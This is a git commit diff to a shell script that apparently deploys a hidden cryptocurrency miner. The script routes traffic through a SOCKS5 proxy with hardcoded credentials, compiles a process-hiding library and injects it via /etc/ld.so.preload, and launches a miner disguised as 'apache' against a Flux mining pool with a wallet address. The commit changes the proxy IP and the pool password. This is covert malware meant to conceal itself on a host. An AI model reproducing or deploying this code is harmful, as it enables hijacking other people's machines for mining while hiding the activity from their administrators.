e18a349d5e189588df532dc029718f5496242470
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-02-12 09:57:56 +0200

    Update start_apache_flu_ws2.sh

--- start_apache_flu_ws2.sh
+++ start_apache_flu_ws2.sh
@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.16.66.235:1080
+socks5 = 52.15.235.202:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./apache --algo 125_4 --server us.flux.herominers.com --port 1200 --ssl 1 --user t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Apache --pass x
+./graftcp/graftcp ./apache --algo 125_4 --server us.flux.herominers.com --port 1200 --ssl 1 --user t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Apache --pass IhatePopUps
